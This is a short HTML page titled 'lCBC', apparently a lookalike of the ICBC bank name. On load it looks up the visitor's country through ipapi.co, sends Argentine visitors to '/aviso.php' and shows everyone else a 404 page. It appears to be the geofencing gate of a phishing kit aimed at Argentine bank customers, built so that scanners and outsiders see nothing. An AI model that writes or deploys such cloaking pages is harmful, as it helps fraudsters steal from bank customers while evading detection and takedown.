<!DOCTYPE html>
<html>
<head>
<link rel="shortcut icon" href="/accstatic/favicon.ico" type="image/x-icon">
<title>lCBC</title>

  <script type="text/javascript">
    // Función para redireccionar o abrir la otra página
    function redireccionar() {
      // Obtener el código del país del usuario
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://ipapi.co/json/', true);
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
          var response = JSON.parse(xhr.responseText);
          var countryCode = response.country_code;

          // Verificar si el país es Argentina
          if (countryCode === 'AR') {
            window.location.href = '/aviso.php'; // Abrir página para usuarios de Argentina
          } else {
            window.location.href = '/404.php'; // Abrir otra página para usuarios de otros países o si no se puede obtener la ubicación
          }
        }
      };
      xhr.send();
    }
  </script>
</head>
<body onload="redireccionar()">
  
</body>
</html>